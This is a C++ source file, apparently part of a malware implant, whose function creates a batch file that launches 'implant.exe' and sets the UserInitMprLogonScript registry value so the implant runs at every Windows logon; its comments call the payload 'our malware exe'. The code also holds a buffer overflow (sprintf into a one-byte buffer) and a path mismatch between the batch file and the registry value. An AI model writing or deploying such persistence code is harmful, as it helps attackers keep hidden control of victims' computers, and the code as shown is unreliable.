#include "persist.h"


void persist_execution(std::string username){

    /* 
    The bat file is in the same directory for reference.
    Create the bat file first - and then this following code will create the registry that will
    start the bat file on startup.
    */

   // Creates a folder for the bat file

   // Persistent method found here
   // https://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/

   std::string path;
   char* c = strcpy(new char[path.length() + 1], path.c_str());
   sprintf(c,"@start \"c:\\users\\%s\\Downloads\\implant.exe\\\"\n",username.c_str());
   path.assign(c,strlen(c));


   mkdir("c:\\Batch");

   // Writes to a new bat file
   std::ofstream batfile;
   batfile.open("c:\\Batch\\UserInitMprLogonScript.bat");

   // Commands for file
   batfile << "@echo off\n";
   //change this line with our malware exe
   batfile << path;
   batfile << "@pause\n";
   // Close the file since finished with writing
   batfile.close();


    // Following section creates a registry key to open bat file on Window startup
    // https://stackoverflow.com/questions/508614/create-a-new-windows-registry-key-using-c
    HKEY hKey;
    LPCTSTR environment = TEXT("Environment");


    LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    LPCTSTR name = TEXT("UserInitMprLogonScript");
    LPCTSTR data = TEXT("c:\\test\\UserInitMprLogonScript.bat");

    LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));

    // Closes handle to key
    RegCloseKey(hKey);

}